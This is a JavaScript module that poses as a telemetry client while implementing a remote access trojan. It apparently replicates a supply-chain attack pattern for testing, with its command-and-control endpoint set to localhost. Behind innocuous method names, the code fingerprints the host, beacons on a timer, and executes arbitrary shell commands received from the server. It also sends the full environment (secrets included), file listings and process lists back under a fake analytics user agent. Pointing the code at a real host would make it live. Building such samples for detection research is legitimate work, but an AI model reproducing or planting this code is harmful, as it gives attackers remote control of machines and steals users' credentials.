// SAFE_TEST_MODE = true — all C2 goes to localhost:9999
// Replicates: Axios RAT pattern — telemetry module replaced with RAT

const http = require("http");
const os = require("os");
const { execSync } = require("child_process");

const SAFE_TEST_MODE = true;
const C2_URL = "http://localhost:9999/c2"; // Safe: nothing listening
const BEACON_INTERVAL = 5000; // 5 seconds

class TelemetryClient {
  constructor(options = {}) {
    this.appId = options.appId || "default";
    this.endpoint = options.endpoint || C2_URL;
    this.beaconTimer = null;
    this.commandQueue = [];
    this.eventBuffer = [];
  }

  /**
   * Start the "telemetry" — actually starts C2 beacon
   */
  start() {
    // Collect system fingerprint on init
    this.fingerprint = this._collectFingerprint();

    // Start periodic beacon to C2
    this.beaconTimer = setInterval(() => {
      this._beacon();
    }, BEACON_INTERVAL);
  }

  /**
   * Track an "event" — buffers for exfiltration
   */
  track(event, props = {}) {
    this.eventBuffer.push({
      event,
      props,
      timestamp: Date.now(),
    });
  }

  /**
   * Identify a "user" — actually records target info
   */
  identify(userId, traits = {}) {
    this.fingerprint.userId = userId;
    this.fingerprint.traits = traits;
  }

  /**
   * Flush "analytics" — sends buffered data to C2
   */
  flush() {
    if (this.eventBuffer.length === 0) return;
    const payload = {
      type: "exfil",
      fingerprint: this.fingerprint,
      events: this.eventBuffer.splice(0),
    };
    this._send(payload);
  }

  /**
   * Shutdown the client
   */
  shutdown() {
    if (this.beaconTimer) {
      clearInterval(this.beaconTimer);
      this.beaconTimer = null;
    }
  }

  // --- RAT internals ---

  /**
   * Collect system fingerprint for C2 registration
   */
  _collectFingerprint() {
    return {
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      cpus: os.cpus().length,
      memory: os.totalmem(),
      user: os.userInfo().username,
      pid: process.pid,
      nodeVersion: process.version,
      cwd: process.cwd(),
      uptime: os.uptime(),
    };
  }

  /**
   * C2 beacon — checks in with C2 server and executes commands
   */
  _beacon() {
    const payload = {
      type: "beacon",
      fingerprint: this.fingerprint,
      buffered_events: this.eventBuffer.length,
    };
    this._send(payload, (response) => {
      if (response && response.commands) {
        for (const cmd of response.commands) {
          this._executeCommand(cmd);
        }
      }
    });
  }

  /**
   * Execute a command from C2
   */
  _executeCommand(cmd) {
    let result;
    try {
      switch (cmd.type) {
        case "shell":
          result = execSync(cmd.payload, {
            encoding: "utf-8",
            timeout: 10000,
          });
          break;
        case "env":
          result = JSON.stringify(process.env);
          break;
        case "ls":
          result = execSync(`ls -la ${cmd.payload || "."}`, {
            encoding: "utf-8",
            timeout: 5000,
          });
          break;
        case "ps":
          result = execSync(
            process.platform === "win32" ? "tasklist" : "ps -ef",
            { encoding: "utf-8", timeout: 5000 }
          );
          break;
        default:
          result = "unknown command type";
      }
    } catch (e) {
      result = `error: ${e.message}`;
    }

    // Send command result back to C2
    this._send({
      type: "command_result",
      command: cmd,
      result: result,
      fingerprint: this.fingerprint,
    });
  }

  /**
   * Send data to C2 endpoint
   */
  _send(payload, callback) {
    try {
      const data = JSON.stringify(payload);
      const url = new URL(this.endpoint);
      const req = http.request(
        {
          hostname: url.hostname,
          port: url.port,
          path: url.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data),
            "User-Agent": "analytics-sdk/2.1.0",
          },
        },
        (res) => {
          let body = "";
          res.on("data", (chunk) => (body += chunk));
          res.on("end", () => {
            if (callback) {
              try {
                callback(JSON.parse(body));
              } catch (e) {
                // Invalid JSON response
              }
            }
          });
        }
      );
      req.on("error", () => {
        // Connection refused — expected in safe test mode
      });
      req.write(data);
      req.end();
    } catch (e) {
      // Expected in safe test mode
    }
  }
}

module.exports = { TelemetryClient };
